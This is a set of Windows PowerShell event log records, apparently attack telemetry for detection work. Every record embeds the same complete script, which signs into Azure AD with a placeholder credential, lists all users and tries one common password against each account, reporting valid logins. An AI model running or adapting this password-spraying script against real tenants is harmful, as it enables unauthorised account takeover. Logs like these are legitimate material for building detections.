{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:00.7283866"},"EventRecordID":"1136","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:00.7283866"},"EventRecordID":"1137","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:00.7283866"},"EventRecordID":"1138","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:00.7283866"},"EventRecordID":"1139","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:00.7283866"},"EventRecordID":"1140","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:00.7283866"},"EventRecordID":"1141","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:01.0180054"},"EventRecordID":"1142","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b5f10634-90e8-4f95-8e11-e37a2d191541\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:02.5249224"},"EventRecordID":"1143","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Certificate, Started, \tProviderName=Certificate\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b5f10634-90e8-4f95-8e11-e37a2d191541\r\n\tPipelineId=2\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:52:02.9580551"},"EventRecordID":"1144","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=18\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=f546a800-0f47-4987-b506-58810ee7bff9\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n($Users = Get-AzureADUser -All $true) &gt; $null\r\nDisconnect-AzureAD &gt; $null\r\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\r\n\r\n$Users | Foreach-Object {\r\n $user = $_.UserPrincipalName\r\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\r\n try {\r\n Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\r\n Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\r\n Disconnect-AzureAD &gt; $null\r\n } catch {\r\n Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b5f10634-90e8-4f95-8e11-e37a2d191541\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
